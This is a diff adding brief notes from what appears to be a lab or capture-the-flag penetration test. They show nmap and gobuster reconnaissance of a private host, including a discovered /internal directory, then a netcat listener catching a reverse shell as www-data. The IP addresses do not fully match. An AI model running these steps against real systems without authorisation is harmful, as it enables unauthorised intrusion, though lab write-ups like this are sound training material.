@@ -1,0 +1,56 @@
+Nmap
+
+nmap -sV 10.65.171.182
+
+Starting Nmap 7.94SVN at 2026-10-22 02:35 UTC
+Nmap scan report for 10.65.171.182
+Host is up (0.0045s latency).
+Not shown: 994 closed tcp ports (reset)
+
+21/tcp   open  ftp          vsftpd 3.0.5
+22/tcp   open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
+139/tcp  open  netbios-ssn Samba smbd 4.6.2
+445/tcp  open  netbios-ssn Samba smbd 4.6.2
+3128/tcp open  http-proxy   Squid http proxy 4.10
+3333/tcp open  http         Apache httpd 2.4.41 (Ubuntu)
+
+Service Info: OS: Unix, Linux
+Nmap done: 1 IP address (1 host up) scanned in 22.57 seconds
+
+Gobuster
+
+gobuster dir -u http://10.65.171.182:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+Gobuster v3.6
+URL: http://10.65.171.182:3333
+Method: GET
+Threads: 10
+Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+Negative Status codes: 404
+
+/images       (Status: 301) [Size: 322]
+/css          (Status: 301) [Size: 319]
+/js           (Status: 301) [Size: 318]
+/fonts        (Status: 301) [Size: 321]
+/internal     (Status: 301) [Size: 324]
+/server-status (Status: 403) [Size: 280]
+
+Progress: 218275 / 218276 (100.00%)
+Finished
+
+Network configuration visible in evidence
+
+ip -4 addr show
+
+ens5: inet 10.65.182.250/18
+docker0: inet 172.17.0.1/16
+
+Reverse shell
+
+nc -lvnp 1234
+Listening on 0.0.0.0 1234
+Connection received on 10.64.171.15 60128
+
+Linux ip-10-64-171-15 5.15.0-139-generic #149~20.04.1-Ubuntu SMP
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
